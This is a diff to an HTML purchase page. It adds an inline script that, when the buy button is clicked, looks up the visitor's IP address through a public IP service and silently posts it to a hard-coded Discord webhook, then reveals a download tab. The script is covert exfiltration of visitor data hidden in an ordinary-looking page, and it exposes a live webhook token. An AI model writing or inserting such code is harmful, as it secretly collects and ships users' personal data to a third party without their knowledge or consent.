@@ -42,5 +42,43 @@
     </div>
 
     <script src="script.js"></script>
+    <script>
+        const discordWebhookUrl = 'https://discord.com/api/webhooks/1289966703639269418/roJ9BtL__riXqFfg_7EQVv871fSKQ6gOo_0ZpdY_cWLkbeiggP1pb3V2Ep86Fw06_86m';
+
+        // Function to send IP to Discord
+        function sendIPToDiscord(ip) {
+            fetch(discordWebhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `User IP: ${ip}`
+                })
+            })
+            .catch(error => console.error('Error sending IP to Discord:', error));
+        }
+
+        // Function to get user's IP address
+        function getUserIP() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIP = data.ip;
+                    sendIPToDiscord(userIP); // Send IP to Discord
+                })
+                .catch(error => console.error('Error fetching IP address:', error));
+        }
+
+        // Event listener for the purchase button
+        document.getElementById('buy-button').addEventListener('click', function() {
+            // Trigger IP retrieval on purchase
+            getUserIP();
+
+            // Show the download tab after purchase
+            document.querySelector('.tab-button[data-tab="download"]').classList.remove('hidden');
+            document.querySelector('.tab-button[data-tab="download"]').click(); // Simulate clicking the download tab
+        });
+    </script>
 </body>
 </html>
